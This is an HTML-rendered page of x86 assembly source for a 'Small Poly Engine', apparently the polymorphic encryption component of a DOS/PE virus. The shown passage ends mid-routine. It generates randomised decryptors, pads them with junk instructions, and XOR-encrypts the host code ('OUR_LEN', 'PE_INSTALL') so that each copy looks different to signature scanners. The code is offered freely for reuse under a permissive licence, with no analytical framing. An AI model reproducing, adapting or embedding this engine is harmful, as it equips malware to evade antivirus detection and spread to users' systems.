<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>SPE.ASI</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;COMMENT /</span><span class="sc0">
</span><span class="sc1">;  (C) VBA Ltd. ALL RIGHTS RESERVED.</span><span class="sc0">
</span><span class="sc1">;  E-mail: support@vba.com.by</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT</span><span class="sc0">
</span><span class="sc1">;  MODIFICATION, ARE PERMITTED.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND</span><span class="sc0">
</span><span class="sc1">;  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span><span class="sc0">
</span><span class="sc1">;  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</span><span class="sc0">
</span><span class="sc1">;  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE</span><span class="sc0">
</span><span class="sc1">;  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span><span class="sc0">
</span><span class="sc1">;  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS</span><span class="sc0">
</span><span class="sc1">;  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span><span class="sc0">
</span><span class="sc1">;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT</span><span class="sc0">
</span><span class="sc1">;  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY</span><span class="sc0">
</span><span class="sc1">;  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF</span><span class="sc0">
</span><span class="sc1">;  SUCH DAMAGE.</span><span class="sc0">
</span><span class="sc1">;/</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;SMALL POLY ENGINE (16/32 PART)</span><span class="sc0">
</span><span class="sc1">;ENTRY: ECX=0,DS=ES=16BIT/BASE=START,SS=FLAT32</span><span class="sc0">
</span><span class="sc1">;EXIT: DI=LENGTH DECRYPTOR+CODE+SOME SHIT(FULL LENGTH) - FOR SPE16(ENCRYPT_BUFF)</span><span class="sc0">
</span><span class="sc1">;        =LENGTH DECRYPTOR - FOR SPE32(SPE32_BUFF - DECRYPTOR)</span><span class="sc0">

</span><span class="sc5">OFF_SPE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">

</span><span class="sc5">SPE</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">    </span><span class="sc10">FAR</span><span class="sc0">

</span><span class="sc5">DWORD_REG</span><span class="sc0">   </span><span class="sc5">ENUM</span><span class="sc0">    </span><span class="sc5">_EAX</span><span class="sc4">,</span><span class="sc5">_ECX</span><span class="sc4">,</span><span class="sc5">_EDX</span><span class="sc4">,</span><span class="sc5">_EBX</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc4">,</span><span class="sc5">_EBP</span><span class="sc4">,</span><span class="sc5">_ESI</span><span class="sc4">,</span><span class="sc5">_EDI</span><span class="sc0">
</span><span class="sc5">WORD_REG</span><span class="sc0">    </span><span class="sc5">ENUM</span><span class="sc0">    </span><span class="sc5">_AX</span><span class="sc4">,</span><span class="sc5">_CX</span><span class="sc4">,</span><span class="sc5">_DX</span><span class="sc4">,</span><span class="sc5">_BX</span><span class="sc4">,</span><span class="sc5">_SP</span><span class="sc4">,</span><span class="sc5">_BP</span><span class="sc4">,</span><span class="sc5">_SI</span><span class="sc4">,</span><span class="sc5">_DI</span><span class="sc0">
</span><span class="sc5">BYTE_REG</span><span class="sc0">    </span><span class="sc5">ENUM</span><span class="sc0">    </span><span class="sc5">_AL</span><span class="sc4">,</span><span class="sc5">_CL</span><span class="sc4">,</span><span class="sc5">_DL</span><span class="sc4">,</span><span class="sc5">_BL</span><span class="sc4">,</span><span class="sc5">_AH</span><span class="sc4">,</span><span class="sc5">_CH</span><span class="sc4">,</span><span class="sc5">_DH</span><span class="sc4">,</span><span class="sc5">_BH</span><span class="sc0">
</span><span class="sc5">SEGM_REG</span><span class="sc0">    </span><span class="sc5">ENUM</span><span class="sc0">    </span><span class="sc5">_ES</span><span class="sc4">,</span><span class="sc5">_CS</span><span class="sc4">,</span><span class="sc5">_SS</span><span class="sc4">,</span><span class="sc5">_DS</span><span class="sc0">
</span><span class="sc5">FREE_SREG</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">_SS</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">FREE_WREG</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc5">_SP</span><span class="sc0">
</span><span class="sc5">ADD_R</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">00B</span><span class="sc0">
</span><span class="sc5">ADD_RB</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">01B</span><span class="sc0">
</span><span class="sc5">ADD_RD</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10B</span><span class="sc0">
</span><span class="sc5">ADD_RIMM</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">11B</span><span class="sc0">
</span><span class="sc5">UNUSED_REG</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0FFH</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">OFF_GET_RAND_2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">ADDRESS_BUFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">FIRST_MASK</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">0E9H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">SPE32</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">SECOND_MASK</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">               </span><span class="sc1">;AX=0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">SEEK_TABLE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_DECRYPTOR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">;SMALL 2 PTR DS:LEN_SEEK</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">SHIT_FLAG</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">FILL_SEEK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">FILL_SEEK</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">             </span><span class="sc1">;END SEEK_TABLE MARKER</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DECRYPTOR</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc5">LEN_MAIN_BUFF</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc5">FILL_BUFF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">FILL_BUFF</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_TRICK</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_8</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">LEN_DECRYPTOR</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">ENCODE_SHIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ENCRYPT_ITER</span><span class="sc0">
</span><span class="sc5">NO_GEN_ENCRYPT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_TRICK</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">ENCODE_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">ADDRESS_BUFF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_DECRYPTOR</span><span class="sc0">
</span><span class="sc5">NEXT_CORRECT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_BUFF</span><span class="sc4">-</span><span class="sc2">100H</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">NEXT_CORRECT</span><span class="sc0">
</span><span class="sc5">DONT_CORRECT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">TEMP_DECRYPTOR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_DECRYPTOR</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
</span><span class="sc1">;MOVE AND ENCRYPT CODE</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">               </span><span class="sc1">;OFFSET START-100H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">OUR_LEN</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">ENCRYPT_CODE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">ENCRYPT_CODE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">GEN_END_SHIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">GEN_END_SHIT</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_BUFF</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">66H</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;======================================</span><span class="sc0">
</span><span class="sc5">SPE32</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">WORD_MODE</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc5">PE_INSTALL</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">RESTORE_REGS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_FILL_RESTORE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">9090H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">               </span><span class="sc1">;FILL NOP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">LOOP_CR</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">@@ISNOP1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@@ISNOP1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">SCASW</span><span class="sc0">                   </span><span class="sc1">;SKIP SHR E/DI</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">@@ISNOP2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@@ISNOP2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">SCASW</span><span class="sc0">                   </span><span class="sc1">;SKIP MOV EBX,[EDI]</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_FILL_CRYPT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">90H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@@ISNOP3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">66H</span><span class="sc0">
</span><span class="sc5">@@ISNOP3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
</span><span class="sc5">OFF_FIXUP</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">   
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">COUNT_REG</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">PUSHED_REGS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">                   </span><span class="sc1">;FILL 7 BYTES</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">24H</span><span class="sc4">],</span><span class="sc5">FREE_WREG</span><span class="sc0">    </span><span class="sc1">;SMALL 1 PTR DS:DIRTY_WREG</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">INIT_LIST</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RANDOM_CALL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">WORK_REG</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_PUSH</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">              </span><span class="sc1">;FOR LOOP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RANDOM_CALL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHANGE_WORK_REG_RELO</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">STORE_WORK_REG_RELO</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHANGE_OFF_REG_RELO</span><span class="sc0">     </span><span class="sc1">;SI=SMALL 1 PTR DS:DEC_OFF_COUNT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">WORD_MODE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SMALL 1 PTR DS:COUNT_REG</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">CMP_IMM</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">CMP_IMM</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">_ECX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_LOOP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_4</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc0">             </span><span class="sc1">;LOOP</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">SMALL_JI</span><span class="sc0">
</span><span class="sc5">NO_LOOP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_DEC</span><span class="sc0">             </span><span class="sc1">;SI=SMALL 1 PTR DS:DEC_OFF_COUNT</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_SIGNED</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">NO_SIGNED</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">LET_JNZ</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">LET_JA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">7FH</span><span class="sc0">              </span><span class="sc1">;JG</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CALC_JI</span><span class="sc0">
</span><span class="sc5">CMP_IMM</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;SMALL 4 PTR DS:TOP_ADDRESS</span><span class="sc0">
